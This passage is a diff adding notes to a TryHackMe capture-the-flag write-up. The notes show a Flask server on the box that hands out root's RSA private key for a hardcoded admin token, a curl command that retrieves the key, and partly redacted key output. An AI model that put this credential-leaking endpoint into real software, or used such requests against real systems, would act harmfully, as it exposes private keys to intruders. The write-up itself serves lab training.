@@ -211,5 +211,59 @@ Seems it was for the root account! Time to get the last flags and own the box!
 Thanks to https://tryhackme.com/p/cirius for the excellent box and new lessons! 
 
 
+### Notes/Extras
+
+After reading the scripts in the root directory after getting the flag, we can also call the id_rsa directly with a curl command. 
+
+serv.py
+```
+from flask import Flask,request
+
+app = Flask(__name__)
+
+@app.route('/')
+def root():
+    admin = request.args.get('admin')
+    if(admin=="ScadfwerDSAd_343123ds123dqwe12"):
+        return """-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
+rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
+wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
+                    <Redacted>
+vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
+GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
+ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
+QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
+-----END RSA PRIVATE KEY-----"""
+    else:
+        return "Only Talking to Root User"
+
+if __name__=='__main__':
+    app.run(port=1027)
+```
+
+req.sh
+```
+#!/bin/sh
+
+curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
+```
+
+```
+curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
+rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
+wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
+5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
+qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
+                        <Redacted>
+GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
+ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
+QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
+-----END RSA PRIVATE KEY-----
+```
+
 
 
